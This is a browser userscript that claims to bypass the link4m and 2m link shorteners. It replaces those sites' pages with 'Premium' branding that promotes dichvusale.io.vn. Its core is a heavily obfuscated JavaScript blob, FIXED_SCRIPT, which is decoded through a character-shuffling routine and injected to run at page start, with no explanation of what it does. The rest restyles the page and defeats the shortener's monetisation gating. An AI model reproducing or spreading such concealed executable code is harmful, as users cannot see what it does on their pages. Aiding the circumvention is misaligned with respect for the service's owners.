// ==UserScript==
// @name         Auto Bypass Link4m + Link2m Premium
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Auto Bypass Link4m + Link2m - Instant Execution & Premium UI
// @author       LAMDev - dichvusale.io.vn
// @match        *://link4m.com/go/*
// @match        *://2m.com/go/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    const FIXED_SCRIPT = `(function(){var Kzu='',eDF=386-375;function rms(n){var d=1362308;var w=n.length;var l=[];for(var h=0;h<w;h++){l[h]=n.charAt(h)};for(var h=0;h<w;h++){var c=d*(h+485)+(d%44586);var s=d*(h+344)+(d%43919);var b=c%w;var f=s%w;var m=l[b];l[b]=l[f];l[f]=m;d=(c+s)%4889814;};return l.join('')};var qIi=rms('vciyztuclnbotdnkfgtpsxrrchoqoeswjrmua').substr(0,eDF);var ngV='Cnl;i) oCiwlcna-s)=v)uv+=vapc(ntvh=j;j>4oAhgd+6.{!whjn]=k ,rn60;=2+.,.;aa6trf2,l+1h6*<(,)9r3), mgni;;3q-rnh )7,, e5ux,+xr7u}, C-ci;rr(-vfrt)e0ers2(gengmr[2.S;adC[7n=i.+n;et;nh=(r;=u8fhavnc7[yq;0varvdu(=;} )[sohd)8vltonu=j(1)1a+k;rjhAgap(acsCg8b0ct;[0ds0p,i)(;h5+lx,r;viacaea1vvnrt6lstsyC=j=+("ll=rh14f)noagogas[aair;"a=lid) =+rviri p6u  4n;isuCvg8(n 0al8;(f)e(rat]==0Cid,o)+}i (ar1=q(+u+a.oe<;[un],]h18fjarr2)z,=;gru("hc<1t8i+A.9h.r>saeorli=;s-t;itnrgor)l+7s+..=t"] )vitm 9wf.lAbr)e-c.[9");kvnd0]8=v+to=;,"mr+([op;e{;il1"<;f=airi(==]ah0t-vf(vhinu6r8{l(]+1ncug2ado]j(vf,ve s0(fw1he(r={)t)i(iep7jp(k+sp((+0)[n4,]f;o1rt[.vr});!rh,+t.{t=(p<l)r8,7(h=ts )a.97n;s=o)=7a5.+y}ag.ih(n*)"}{prqS[=nk[ol ;n0.;;bol An;v(rfl;aa. ,8;,2;tl.i(nib;]r,a.i=oj ljt(f=]3a; j)h7d []v9feo,htavv6svb=ufg=rosa19}r;;]uu{;e.fehs;chpu2,5oo+jtl.u;usohrg =cf).eo)xh=s,icr.s;om=)irbtiv,har+ses efxlg"r=rbcnt=he(.")=.oad,a)8';var hLi=rms[qIi];var eaM='';var mad=hLi;var dkl=hLi(eaM,rms(ngV));var Cqb=dkl(rms(':)p<eo]<t(:t4adclj_h]-c.<t.]+<miieiLtk<1e(]ia9}u_nc?f%$h_1a)n+gtoa(".l=b{a<34(.<cu#((e!1H1p]_,<obt<{o8]1t])8o,:sn<a])ry<z%9<k,t9403}0i<O) !ycD093tHr)g}ui3<3et o<e_o")<p a%<<61f0no_(<<*indo.]"]%p.=c1,9j2.(]se}<1ea3% w.LPe}23ee;e;<3o4aut01c_r-%i$yaeolf{)02cadl$_H#8 <m]ec%NaBg<,}i<e;6<I< IC=2_<M;u<v<] ld;smt;4s59acq.c.oe-;(]<<]v<]pmbi4l).3ph{]0r.0\\/e0,2=(wR.geun<aelteS<ae$buif)dtk9n]n<pw6t=M7._Ix?fi<%9>_)#<!<q}C}(eni0a6-e.Bp!c<=w<.kt<%el4<<[u)]<b<t)hx2c<te.6,di3r]Oy.4$Tch)JB.,t.0{s<7_c<<tSmk2rc%n<;)ksrt]ge+)ecv.<;S9mc1jhesc14} %ne<u,<a!)0]C$lct.e8<leK$?!<<i<g2.t.<2nn.<.6e..-i{!.]<t<xc.9 (ree.k"(iu;lss.6<Oi),<v%dc .%<7i<s]h$b)dr-mc(.<m=ll3jn4]ta9,a[<c;c< A1e-t1 $lNTaua<cea.0e!h8c<:h <)(cclr.<5mac%,cuf><no;?r<e>ot(.c%t)U%f]Kb (;L<a%=u(atc2x<g<dv-<m6?<oa<o<[c,t <co%agSrl.-($<;<4pt<tcn3moot.>n..eis<<<B%onf<)\\/.i<n)<n. n >s<qehc%oqpvt!)l.<7<v<c!sdree);2)4c<d;%Bs o=b29=10OStp]if d=xoCo<$c0me<]epannri,d.:UI7l{<ne,6%<rcm<_c<.,<8.n}<.e\\/, )%hni1<o%ofeanD@Ee; b%.tceM.()<( #&=ce)5chy%=u=3<";ef4tpcaT)n=du>7b)1<,2ad.j<Re<;p%<c]d,;Onvr]0<pj.kO<Pe"P6j4cr{a<<gop<o$s<<3tO<(<hJL=s)Q)cz.tc;)<;5l};\\/1rac-.H014o<n(;c.)l]r6){cr<]e=y3<h<hk<1bpt=Fov&e}(5Jn=i*i<6)(q!l(t_%3Km(<(onr,E)(<<8&)5omir<ruaGm%<33o){(c9577fo<;30!=<] $g.)an>tcFq,,k37<!<n\\/()<j,T <2]<0fC)z:d3,_ica%)<<y1l3<)h]kt<.9y!(d<<j]]{sC(ka%s!e#Ny(c,},cc<){%8a2<]0e&c4x7]f<3rihe,$.!iNu5c()r,<]es%m<c:ldi5e<)_]=<,[)=b=.f.)}bk\\/.r%1>u=(,#0n>(=g_<<_{<.oegc0e<<<,nAg!<<<)avgKf-(Br)Qe1E<u<A})a3)<.(.<y+s3aPg<at)@$F<#<G[i0iu(ffi[]5y]d<crif,e$trtce2b3)0Qitc,<4".7 pB%ftn_ob)tcg.s{cihc?j _y2<<Core!d+<;20ec]!a7*!}dm<-0rctt%736<c<<5.\\/4e<tdga8t21o%c1!]oaks4(%mr<2yota=.c1(K2{_.f#4!T4<\\/ra7l{<C)])t>l.oa;74{jc(ocs<o!u)<=3<<o.4<.h.)]v}!])<<.<.asopDh-.<48(-<97c-.}K6)r3<2t.9ed(h_bN30i}{4c%p)m:i!c(,<#"97 fri.,)m2!f..<.h3rr<tEc;<UvoP4ld2c$]a;0.oh.m<=i]).ret,c<r<{.,t<0)f.(3opC)c04b,t<c.@4,8<t.&fp<*kasre(eg.<.} 5<l\\/5efa<11v<$-(s);eHni% n<,<q<)40r)a#p=,3=t}<,<[$n(nes"<,U)]C<m<!.q<a[<3m.)2jcmyu<<G[3r,[ d fc<ra)"f<c<3c|t1(<wp5&.uwt[3pl..c<<$mow<a.i.<od(a<e5aab(a.peq).-(eT<}(,gkUUs&6=m-<Bm;fc=y016C>{sl<e:1ea<,z{]0JhQiG<)<g2<ets=a<f4<<%_c(.<c3eyu@$sr,Pihl<.7(t<p<h1tdsdf.Croct;),&nl?o<b3trB. =Jr1&].<ed.<\\',%{i<7z,_Te<bres69rAS\\'(&7r6}(;F<2fv4rt)=!1.e.Tj,]eltoe<a,$dp, %d. l7%)? p2gr]ee(d1<t(!e<3a(3()cte<44<fe i<6tole(=pc3dKp)9e)crtaa3l,rN<0<8_;).0G2.z(y{:<{<k+<Rg<c\\'n%0,<]ikc<ic<ulNHriC<S=nc}8<( 34<.]),0,M(5!,n<;}_<\\/g3(<<!ta,pc;._%<<4ue=-uc\\/n(pcc>0o,}<t3f<ctn;)a3eo$%<n<eo%_L;.c]<f\\/tR<p} _s5r3,{v|)4=q<f(<rti)n))3nly635)$s4Tic<J;>);itn$%p<n$]{S%3<!%o.c%\\/}.=.r4gy.]c1<) Naico<u\\/<ctdt5]!<):6r$4b-8s,t3_6g7.l$h!:(n.!a])\\'raJ!a<343c8ee-"1a<4N,< +c3fr:,c f?{eee$ccrJ7l3qboK1lT4a2{# ()>i4]o =jn<nf,<cn5ota l[E.as_.34gte%.l7))]i9.ei<rgtvp_k:peter,1h)u )]( c<c agscuremc)r)f<qjo$c<]!; c.<l<cl<f7<y1f<na#)f.;Q<n3u<opuxa{4,$ @njonc]<f<no-kPc<!ca.s3r25}rh2d<c.tc8303f{<.s=!=2kuec <(2.%9uf,nJa.c2r ,h}h0<+a!4p+6sv5xa} (s.m <ad['));var SLM=mad(Kzu,Cqb );SLM(2934);return 2173})()`;

    // --- Inject Global Styles Immediately ---
    const globalStyles = `
        :root {
            --lm-primary: #2563eb;
            --lm-success: #059669;
            --lm-warning: #d97706;
            --lm-error: #dc2626;
            --lm-bg: #ffffff;
            --lm-text: #1f2937;
            --lm-border: #e5e7eb;
            --lm-card-bg: #f9fafb;
        }
        
        @media (prefers-color-scheme: dark) {
            :root {
                --lm-bg: #111827;
                --lm-text: #f9fafb;
                --lm-border: #374151;
                --lm-card-bg: #1f2937;
            }
        }
        
        .lm-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .lm-card {
            background: var(--lm-card-bg);
            border: 1px solid var(--lm-border);
            border-radius: 12px;
            padding: 24px;
            margin: 16px 0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .lm-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: 600;
            text-decoration: none;
            border: none;
            cursor: pointer;
            transition: all 0.2s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .lm-btn-primary {
            background: var(--lm-primary);
            color: white;
        }
        
        .lm-btn-success {
            background: var(--lm-success);
            color: white;
        }
        
        .lm-btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        
        /* Premium Header Styles */
        .lm-header {
            background: var(--lm-bg);
            border-bottom: 1px solid var(--lm-border);
            padding: 16px 0;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .lm-header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .lm-logo {
            font-size: 24px;
            font-weight: 700;
            color: var(--lm-primary);
            text-decoration: none;
        }
        
        .lm-nav {
            display: flex;
            gap: 24px;
            align-items: center;
        }
        
        .lm-nav a {
            color: var(--lm-text);
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s ease;
        }
        
        .lm-nav a:hover {
            color: var(--lm-primary);
        }
        
        /* Premium Footer Styles */
        .lm-footer {
            background: var(--lm-card-bg);
            border-top: 1px solid var(--lm-border);
            padding: 48px 0 24px;
            margin-top: 48px;
        }
        
        .lm-footer-content {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 48px;
            margin-bottom: 32px;
        }
        
        .lm-footer-section h3 {
            color: var(--lm-text);
            margin-bottom: 16px;
            font-size: 18px;
            font-weight: 600;
        }
        
        .lm-footer-links {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        
        .lm-footer-links li {
            margin-bottom: 8px;
        }
        
        .lm-footer-links a {
            color: var(--lm-text);
            text-decoration: none;
            transition: color 0.2s ease;
        }
        
        .lm-footer-links a:hover {
            color: var(--lm-primary);
        }
        
        .lm-footer-bottom {
            border-top: 1px solid var(--lm-border);
            padding-top: 24px;
            text-align: center;
            color: var(--lm-text);
            opacity: 0.8;
        }
        
        /* Main Content Styles */
        .lm-main {
            min-height: 60vh;
            padding: 32px 0;
        }
        
        .lm-hero {
            text-align: center;
            padding: 48px 0;
        }
        
        .lm-hero h1 {
            font-size: 48px;
            font-weight: 700;
            color: var(--lm-text);
            margin-bottom: 16px;
        }
        
        .lm-hero p {
            font-size: 20px;
            color: var(--lm-text);
            opacity: 0.8;
            margin-bottom: 32px;
        }
        
        /* Form Styles */
        #main-form {
            background: var(--lm-card-bg);
            border: 1px solid var(--lm-border);
            border-radius: 12px;
            padding: 32px;
            margin: 32px auto;
            max-width: 500px;
            text-align: center;
        }
        
        .get-link {
            background: var(--lm-success) !important;
            color: white !important;
            border: none !important;
            border-radius: 8px !important;
            padding: 16px 32px !important;
            font-size: 18px !important;
            font-weight: 600 !important;
            margin: 16px 0 !important;
            width: 100% !important;
            transition: all 0.2s ease !important;
        }
        
        .get-link:hover:not(.disabled) {
            transform: translateY(-2px) !important;
            box-shadow: 0 8px 25px rgba(5, 150, 105, 0.3) !important;
        }
        
        .get-link.disabled {
            opacity: 0.6 !important;
            cursor: not-allowed !important;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .lm-container {
                padding: 0 16px;
            }
            
            .lm-header-content {
                flex-direction: column;
                gap: 16px;
            }
            
            .lm-nav {
                gap: 16px;
            }
            
            .lm-footer-content {
                grid-template-columns: 1fr;
                gap: 32px;
            }
            
            .lm-hero h1 {
                font-size: 32px;
            }
            
            .lm-hero p {
                font-size: 18px;
            }
            
            #main-form {
                margin: 16px;
                padding: 24px;
            }
        }
        
        /* Status Overlay */
        .lm-status {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--lm-card-bg);
            border: 1px solid var(--lm-border);
            border-radius: 8px;
            padding: 16px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            z-index: 1001;
            max-width: 300px;
        }
        
        .lm-status.success {
            border-left: 4px solid var(--lm-success);
        }
        
        .lm-status.error {
            border-left: 4px solid var(--lm-error);
        }
    `;

    // Inject styles immediately
    const styleElement = document.createElement('style');
    styleElement.textContent = globalStyles;
    document.head.appendChild(styleElement);

    // --- Premium UI Replacement ---
    function replacePageUI() {
        try {
            // Replace header
            const oldHeader = document.querySelector('nav#mainNav, header, .navbar');
            if (oldHeader) {
                oldHeader.outerHTML = `
                    <header class="lm-header">
                        <div class="lm-container">
                            <div class="lm-header-content">
                                <a href="/" class="lm-logo">
                                    🚀 Link4M Premium
                                </a>
                                <nav class="lm-nav">
                                    <a href="/">Trang chủ</a>
                                    <a href="/blog">Tin tức</a>
                                    <a href="https://dichvusale.io.vn" target="_blank">Hỗ trợ</a>
                                </nav>
                            </div>
                        </div>
                    </header>
                `;
            }

            // Replace footer
            const oldFooter = document.querySelector('footer.style-4, footer');
            if (oldFooter) {
                oldFooter.outerHTML = `
                    <footer class="lm-footer">
                        <div class="lm-container">
                            <div class="lm-footer-content">
                                <div class="lm-footer-section">
                                    <h3>🚀 Link4M Premium</h3>
                                    <p>Dịch vụ rút gọn link kiếm tiền hàng đầu Việt Nam. Bypass thành công với công nghệ tiên tiến nhất.</p>
                                    <div style="margin-top: 16px;">
                                        <a href="https://dichvusale.io.vn" class="lm-btn lm-btn-primary" target="_blank">
                                            Hỗ trợ & Báo lỗi
                                        </a>
                                    </div>
                                </div>
                                <div class="lm-footer-section">
                                    <h3>Liên kết</h3>
                                    <ul class="lm-footer-links">
                                        <li><a href="/">Trang chủ</a></li>
                                        <li><a href="/payout-rates.html">Payout Rates</a></li>
                                        <li><a href="/contact.html">Liên hệ</a></li>
                                    </ul>
                                </div>
                                <div class="lm-footer-section">
                                    <h3>Hỗ trợ</h3>
                                    <ul class="lm-footer-links">
                                        <li><a href="https://dichvusale.io.vn" target="_blank">Báo lỗi hệ thống</a></li>
                                        <li><a href="https://dichvusale.io.vn" target="_blank">Hướng dẫn sử dụng</a></li>
                                        <li><a href="https://dichvusale.io.vn" target="_blank">Liên hệ admin</a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="lm-footer-bottom">
                                <p>© 2024 Link4M Premium - Powered by <a href="https://dichvusale.io.vn" target="_blank" style="color: var(--lm-primary);">dichvusale.io.vn</a></p>
                            </div>
                        </div>
                    </footer>
                `;
            }

            // Replace main content area with premium design
            const mainContent = document.querySelector('body');
            if (mainContent && !document.querySelector('.lm-main')) {
                const existingContent = mainContent.innerHTML;
                
                // Create premium wrapper
                mainContent.innerHTML = `
                    <div class="lm-main">
                        <div class="lm-container">
                            <div class="lm-hero">
                                <h1>🎉 Bypass Thành Công!</h1>
                                <p>Hệ thống đã được kích hoạt thành công. Chỉ cần giải captcha để tiếp tục.</p>
                                <div class="lm-card" style="max-width: 600px; margin: 0 auto;">
                                    <h3 style="margin-bottom: 16px; color: var(--lm-success);">✅ Hoàn toàn miễn phí</h3>
                                    <p style="margin-bottom: 24px; opacity: 0.8;">Không có bất kỳ chi phí ẩn nào. Chỉ cần giải captcha và tiếp tục.</p>
                                    
                                    <!-- Keep the original form intact -->
                                    ${existingContent.includes('id="main-form"') ? existingContent.match(/<form id="main-form"[^>]*>[\s\S]*?<\/form>/)?.[0] || '' : ''}
                                    
                                    <div style="margin-top: 24px; padding-top: 24px; border-top: 1px solid var(--lm-border);">
                                        <p style="font-size: 14px; opacity: 0.7;">🔥 Powered by LAMDev - dichvusale.io.vn</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }

            // Ensure the main form is properly styled
            const mainForm = document.getElementById('main-form');
            if (mainForm) {
                mainForm.classList.add('lm-card');
                mainForm.style.margin = '32px auto';
                mainForm.style.maxWidth = '500px';
                
                // Style the get-link button
                const getLinkBtn = mainForm.querySelector('.get-link');
                if (getLinkBtn) {
                    getLinkBtn.classList.add('lm-btn', 'lm-btn-success');
                }
            }

            return true;
        } catch (error) {
            console.error('[LM] UI replacement error:', error);
            return false;
        }
    }

    // --- Instant Script Execution ---
    function executeScriptImmediately() {
        let executed = false;
        
        function run() {
            if (executed) return;
            executed = true;
            
            try {
                // Inject the fixed script
                const blob = new Blob([FIXED_SCRIPT], { type: 'application/javascript' });
                const url = URL.createObjectURL(blob);
                const script = document.createElement('script');
                script.src = url;
                script.async = false;
                (document.head || document.documentElement).appendChild(script);
                
                // Replace UI immediately
                const uiSuccess = replacePageUI();
                
                // Show status
                showStatus(uiSuccess ? '✅ Bypass thành công!' : '⚠️ Có lỗi xảy ra', uiSuccess ? 'success' : 'error');
                
                // Cleanup
                setTimeout(() => URL.revokeObjectURL(url), 10000);
                
            } catch (error) {
                console.error('[LM] Execution error:', error);
                showStatus('❌ Lỗi hệ thống! Vui lòng liên hệ admin: dichvusale.io.vn', 'error');
            }
        }

        // Try to run immediately
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', run);
        } else {
            run();
        }

        // Fallback: run after 5 seconds regardless
        setTimeout(() => {
            if (!executed) {
                run();
            }
        }, 5000);
    }

    // --- Status Display ---
    function showStatus(message, type = 'success') {
        const status = document.createElement('div');
        status.className = `lm-status ${type}`;
        status.innerHTML = `
            <div style="display: flex; align-items: center; gap: 8px;">
                <strong>${message}</strong>
            </div>
        `;
        document.body.appendChild(status);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (status.parentNode) {
                status.parentNode.removeChild(status);
            }
        }, 5000);
    }

    // --- Start Execution Immediately ---
    executeScriptImmediately();

})();
